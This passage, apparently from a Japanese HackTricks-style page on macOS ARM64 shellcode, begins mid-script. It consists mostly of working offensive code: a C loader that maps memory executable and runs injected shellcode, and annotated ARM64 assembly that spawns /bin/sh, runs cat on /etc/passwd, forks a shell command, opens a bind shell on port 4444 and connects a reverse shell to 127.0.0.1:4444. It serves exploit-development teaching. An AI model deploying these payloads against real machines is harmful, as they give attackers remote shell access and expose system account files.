echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>shellcodeをテストするCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**こちら**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)から引用し、解説しています。<sup>[1]</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### catで読み取る

目的は`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。そのため、2番目の引数（x1）はパラメータの配列です（メモリ上では、アドレスがスタックに積まれたものを意味します）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### fork から sh でコマンドを呼び出し、main process が kill されないようにする
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) の **port 4444** における Bind shell<sup>[2]</sup>
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)より、**127.0.0.1:4444**へrevshell<sup>[3]</sup>。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## 参考文献

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
